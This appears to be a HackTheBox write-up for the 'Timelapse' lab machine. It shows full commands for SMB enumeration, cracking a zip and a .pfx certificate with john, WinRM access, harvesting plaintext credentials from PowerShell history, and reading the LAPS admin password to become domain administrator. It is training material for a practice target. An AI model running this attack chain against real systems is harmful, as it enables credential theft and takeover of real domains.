### TimeLapse HackTheBox

### Difficulty = Easy

### IP Address  = 10.10.11.152

Nmap Scan:

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Timelapse]
└─$ nmap -sCV -A 10.10.11.152 -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 04:18 WAT
Nmap scan report for 10.10.11.152
Host is up (0.29s latency).

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-02-07 11:18:35Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2023-02-07T11:19:59+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb2-time: 
|   date: 2023-02-07T11:19:21
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.14 seconds
                                                                
```

From the result nmap gave we can tell its an AD box 

I'll add the domain name to my /etc/hosts file

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Timelapse]
└─$ cat /etc/hosts | grep dc01
10.10.11.152    dc01.timelapse.htb timelapse.htb
```

Checking smb shows we have only read access over the Share `shares` in smb

```
┌──(venv)─(mark__haxor)-[~/Downloads]
└─$ smbmap -H 10.10.11.152 -u lol 
[+] Guest session       IP: 10.10.11.152:445    Name: 10.10.11.152                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
```

I'll connect to it and list what it has in there

```
┌──(venv)─(mark__haxor)-[~/Downloads]
└─$ smbclient  //10.10.11.152/Shares
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 16:39:15 2021
  ..                                  D        0  Mon Oct 25 16:39:15 2021
  Dev                                 D        0  Mon Oct 25 20:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 16:48:42 2021

                6367231 blocks of size 4096. 1287701 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 20:40:06 2021
  ..                                  D        0  Mon Oct 25 20:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021

                6367231 blocks of size 4096. 1287701 blocks available
smb: \Dev\> cd ..
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (362.8 KiloBytes/sec) (average 295.1 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (110.1 KiloBytes/sec) (average 258.1 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (546.5 KiloBytes/sec) (average 315.3 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (76.0 KiloBytes/sec) (average 282.0 KiloBytes/sec)
smb: \> 
```

The Dev directory has a winrm_backup.zip file but its password protected

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ ls   
winrm_backup.zip
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```

I'll brute force the zip file 

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ zip2john winrm_backup.zip > hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ john -w=/home/mark/Documents/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-02-07 04:26) 1.724g/s 5981Kp/s 5981Kc/s 5981KC/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now with the password i can unzip the file

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ file legacyy_dev_auth.pfx 
legacyy_dev_auth.pfx: data
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ strings legacyy_dev_auth.pfx    
_       Er
C(!,
4bz'
`o<l
|Y4W
I0{Q
L(vqQ#
{q[l"8
`+$DOC
hK*y
;5UERr
X!+3
&JCy
$-1f
NAM'u
"-r$$
Legacyy0
211025140552Z
311025141552Z0
Legacyy0
r"*J0:
cZK3
".G,
x0v0
legacyy@timelapse.htb0
}J5~f
t{(lz
5&8H
&4<6
kj@1
uUh2s
```

It's just a data file but we geta valid email `legacyy@timelapse.htb`

I'll check the other directory

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/HelpDesk]
└─$ ls -al
total 1904
drwxr-xr-x 2 mark mark    4096 Feb  7 04:21 .
drwxr-xr-x 4 mark mark    4096 Feb  7 04:22 ..
-rw-r--r-- 1 mark mark  104422 Feb  7 04:21 LAPS_Datasheet.docx
-rw-r--r-- 1 mark mark  641378 Feb  7 04:21 LAPS_OperationsGuide.docx
-rw-r--r-- 1 mark mark   72683 Feb  7 04:21 LAPS_TechnicalSpecification.docx
-rw-r--r-- 1 mark mark 1118208 Feb  7 04:21 LAPS.x64.msi
```

Word document file. I'll open it up on windows since libreoffice refuses to work for me 

So basically the file talks about LAPS (Local Administrator Password Management Datasheet)
![image](https://user-images.githubusercontent.com/113513376/217142161-ccd52dd4-c6d7-43df-93e7-1357609b68b1.png)

And there's a binary which comes along it to install LAPS
![image](https://user-images.githubusercontent.com/113513376/217142370-4567e10b-2e4c-49fd-9fb3-6459a0403753.png)

Local Administrator Password Solution (LAPS) is a method of managing the passwords for the local administrator accounts via the domain. Without laps, it’s very challenging for a support team to manage keeping unique local admin passwords for each system. This leads to shared credentials, which means that when an attacker gets elevated privileges on a system, they can dump the shared cred and use it to get access on other systems.

LAPS also rotates administrator passwords, changing them periodically, such that if they are captured by an attacker, they become invalid after some period of time.

So the .pfx file is going to contain keys for us to login as 

Using this [post](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)

I tried it but it requires password

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out lol.key
Enter Import Password:
Mac verify error: invalid password?
```

Luckily john the ripper can brute force this if converted to hash 

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ pfx2john legacyy_dev_auth.pfx > hash
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ john -w=/home/mark/Documents/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:45 DONE (2023-02-07 05:08) 0.009457g/s 30558p/s 30558c/s 30558C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Cool now i'll run it using the password `thuglegacy`

With the password, I can extract the key and certificate. When extracting the key, it asks for the password (I’ll provide `thuglegacy`), and then a password for the output .pem file (anything I want, must be at least four characters):

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key 
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

Now i'll decrypt the key using the pem pass phrase set in my case i used `1234`

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$  openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth.key1 
Enter pass phrase for legacyy_dev_auth.key:
writing RSA key
```

Next i'll dump it 

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$  openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:

┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ l
legacyy_dev_auth.crt  legacyy_dev_auth.key  legacyy_dev_auth.key1  legacyy_dev_auth.pfx*
```

Cool with this we can get access to winrm (ssl)

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ evil-winrm --help                                

Evil-WinRM shell v3.4

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

Just specify the argument then login

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ evil-winrm -S -c legacyy_dev_auth.crt -k legacyy_dev_auth.key -i timelapse.htb  

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami 
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

Cool time to escalate privilege 

I'll upload winPEAS to the box and run it

But damn theres AV on it 

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> .\winPEAS.exe
Program 'winPEAS.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\winPEAS.exe
+ ~~~~~~~~~~~~~.
At line:1 char:1
+ .\winPEAS.exe
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

Manual enumeration it is then!!! I'll check the powershell history file to see if i get anything from it
![image](https://user-images.githubusercontent.com/113513376/217147870-9c411131-ccc7-4139-b228-59e88e1afa58.png)

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> more $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

Cool we see that there's credential which belongs to user svc_deploy

I'll login to winrm as svc_deploy using the credential 

```
Username: svc_deploy
Password: E3R$Q62^12p7PLlC%KWaxuaV
```

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

I'll do manual check again

```
*vil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

The user `svc_deploy` is among the `LAPS_Readers` group. This group can read the local administrator password

To read the LAPS password, I just need to use `Get-ADComputer` and specifically request the `ms-mcs-admpwd`property:

```
Command: Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : @2Fq%pB0wsf4$%TY6p1j&4,5
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

So the admin password is `@2Fq%pB0wsf4$%TY6p1j&4,5` i'll login as admin using the password

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ evil-winrm -i timelapse.htb -u administrator -p '@2Fq%pB0wsf4$%TY6p1j&4,5' -S

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

And we're done

<br> <br>
[Back To Home](../../index.md)




